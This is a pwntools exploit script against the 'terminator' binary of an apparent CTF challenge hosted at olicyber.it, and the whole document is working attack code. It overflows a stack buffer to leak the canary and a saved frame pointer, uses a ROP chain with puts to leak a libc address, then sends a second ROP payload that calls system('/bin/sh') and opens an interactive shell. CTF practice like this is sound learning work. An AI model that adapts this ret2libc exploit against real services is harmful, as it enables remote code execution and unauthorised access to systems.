#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'terminator_patched')

host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

libc = ELF('libs/libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

rop = ROP(exe)
io = start()

io.sendlineafter(b'> ', b'A' * 55)
io.recvuntil(b'\n\n')

leak = io.recvuntil(b'Nice')
canary = int.from_bytes(b'\x00' + leak[:7], 'little')
rbpAddr = int.from_bytes(leak[7:-4], 'little')

pop_rdi = rop.find_gadget(['pop rdi'])[0]
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']

payload = b'\x90' * 24 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(exe.sym['main']) + p64(canary) + p64(rbpAddr - 0x50)

io.sendlineafter(b'> ', payload)
putsAddr = int.from_bytes(io.recvlines(3)[1], 'little')
libcAddr = putsAddr - 0x80ed0

libc.address = libcAddr
systemAddr = libcAddr + 0x50d60
binsh = next(libc.search(b'/bin/sh\x00'))

log.info(f"Libc Addr: {hex(libcAddr)}")
log.info(f"System Addr: {hex(systemAddr)}")
log.info(f"Bash String: {hex(binsh)}")

payload = b'\x90' * 32 + p64(pop_rdi) + p64(binsh) + p64(systemAddr) + p64(canary) + p64(rbpAddr - 0x78)

io.sendlineafter(b'> ', payload)
io.recvlines(5)

io.interactive()
